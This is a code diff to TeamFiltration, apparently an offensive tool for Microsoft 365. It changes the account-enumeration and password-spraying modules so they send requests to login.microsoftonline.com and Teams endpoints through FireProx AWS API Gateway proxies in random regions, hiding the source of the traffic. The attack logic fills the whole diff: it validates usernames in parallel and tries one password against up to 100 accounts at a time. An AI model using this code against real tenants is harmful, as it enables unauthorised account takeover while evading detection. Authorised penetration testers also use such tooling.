@@ -131,16 +131,16 @@ namespace TeamFiltration.Modules
 
             }
         }
-        public static async Task<bool> CheckO365Method(MSOLHandler msolHandler, string domain)
+        public static async Task<bool> CheckO365Method(MSOLHandler msolHandler, string domain, string url)
         {
             var randomUsername = Guid.NewGuid().ToString().Replace("-", "") + domain;
-            var validUser = await msolHandler.ValidateO365Account(randomUsername, true, false);
-            return !validUser;
+            var validUser = await msolHandler.ValidateO365Account(randomUsername, url, true, false);
+            return validUser;
         }
-        public static async Task<bool> ValidUserWrapperLogin(MSOLHandler msolHandler, string username, string tempPassword)
+        public static async Task<bool> ValidUserWrapperLogin(MSOLHandler msolHandler, string username, string tempPassword, string fireProxHolder)
         {
 
-            var fireProxHolder = _globalProperties.GetFireProxURL("https://login.microsoftonline.com", 0) + "common/oauth2/token";
+
             var rescHolder = Helpers.Generic.RandomO365Res();
 
             var sprayAttempt = new SprayAttempt()
@@ -205,10 +205,10 @@ namespace TeamFiltration.Modules
             return false;
         }
 
-        public static async Task ValidUserWrapperO365(MSOLHandler msolHandler, string username)
+        public static async Task ValidUserWrapperO365(MSOLHandler msolHandler, string username, string url)
         {
 
-            var validUser = await msolHandler.ValidateO365Account(username, true);
+            var validUser = await msolHandler.ValidateO365Account(username, url, true);
             if (validUser)
             {
                 _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));
@@ -350,9 +350,19 @@ namespace TeamFiltration.Modules
                     _databaseHandle.WriteLog(new Log("ENUM", $"Warning, this method may give some false positive accounts", ""));
                     _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating { userListData.Count() } possible accounts, this will take ~{approcTime} minutes", ""));
 
+                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", (new Random()).Next(0, _globalProperties.AWSRegions.Length));
+
+                    var url = $"https://{enumUserUrl.Item1.RestApiId}.execute-api.{enumUserUrl.Item2.Region}.amazonaws.com/fireprox/common/GetCredentialType";
                     //Check if this options is possible
-                    if (await CheckO365Method(msolHandler, $"@{domain}"))
+                    if (!domain.StartsWith("@"))
                     {
+                        domain = "@" + domain;
+                    }
+                    if ((await CheckO365Method(msolHandler, $"{domain}", url)) == true)
+                    {
+
+                        //  var url = _globalProperties.GetBaseUrl().Replace("common/oauth2/token", "common/GetCredentialType");
+
 
                         foreach (var item in Helpers.Generic.SplitList<string>(userListData.ToList(), 20))
                         {
@@ -360,7 +370,7 @@ namespace TeamFiltration.Modules
                             await userListData.ParallelForEachAsync(
                                 async user =>
                                 {
-                                    await ValidUserWrapperO365(msolHandler, user);
+                                    await ValidUserWrapperO365(msolHandler, user, url);
 
                                 },
                             maxDegreeOfParallelism: 20);
@@ -370,12 +380,16 @@ namespace TeamFiltration.Modules
                             //    Console.WriteLine("Output will be wrong");
                         }
 
+                       
                     }
                     else
                     {
-                        _databaseHandle.WriteLog(new Log("ENUM", "o365 validation method unavailable for this tentant, try teams method!"));
+                        _databaseHandle.WriteLog(new Log("ENUM", "O365 validation method unavailable for this tentant, try teams method!"));
 
                     }
+
+                    if (_globalProperties.DeleteFireProx)
+                        await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);
                 }
                 else if (options.ValidateAccsTeams)
                 {
@@ -408,11 +422,17 @@ namespace TeamFiltration.Modules
 
 
                             //We need a skype token to get other stuff
-                            await teamsHandler.SetSkypeToken();
+                            var getSkypeToken = await teamsHandler.SetSkypeToken();
 
+                            if (getSkypeToken.Item2 != null)
+                            {
+                                _databaseHandle.WriteLog(new Log("ENUM", $"Error getting Skype token: {getSkypeToken.Item2.message}", ""));
+                                Environment.Exit(0);
+                            }
                             _databaseHandle.WriteLog(new Log("ENUM", $"Loaded {userListData.Count()} usernames", ""));
 
-                            var enumUserUrl = _globalProperties.GetFireProxURLObject("https://teams.microsoft.com/api/mt/", (new Random()).Next(0, _globalProperties.AWSRegions.Length));
+
+                            (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl = _globalProperties.GetFireProxURLObject("https://teams.microsoft.com/api/mt/", (new Random()).Next(0, _globalProperties.AWSRegions.Length));
 
                             //Perfom an sanity check to make sure we can validate anything for this tenant at all
 
@@ -437,6 +457,11 @@ namespace TeamFiltration.Modules
                                 await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);
 
                         }
+                        else
+                        {
+                            _databaseHandle.WriteLog(new Log("ENUM", $"Teams enumeration failed, error: {teamsToken.bearerTokenError.error_description}", ""));
+
+                        }
                     }
                     else
                     {
@@ -452,14 +477,21 @@ namespace TeamFiltration.Modules
                     _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating { userListData.Count() } accounts with password {tempPw}, this will take ~{approxTime} minutes", ""));
 
 
+                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) enumUserUrl
+                        = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", (new Random()).Next(0, _globalProperties.AWSRegions.Length));
+
+
                     await userListData.ParallelForEachAsync(
                         async user =>
                         {
-                            await ValidUserWrapperLogin(msolHandler, user, tempPw);
+                            await ValidUserWrapperLogin(msolHandler, user, tempPw, $"https://{enumUserUrl.Item1.RestApiId}.execute-api.{enumUserUrl.Item2.Region}.amazonaws.com/fireprox/common/oauth2/token");
 
                         },
                         maxDegreeOfParallelism: 100);
 
+
+                    if (_globalProperties.DeleteFireProx)
+                        await _globalProperties._awsHandler.DeleteFireProxEndpoint(enumUserUrl.Item1.RestApiId, enumUserUrl.Item2.Region);
                 }
 
 
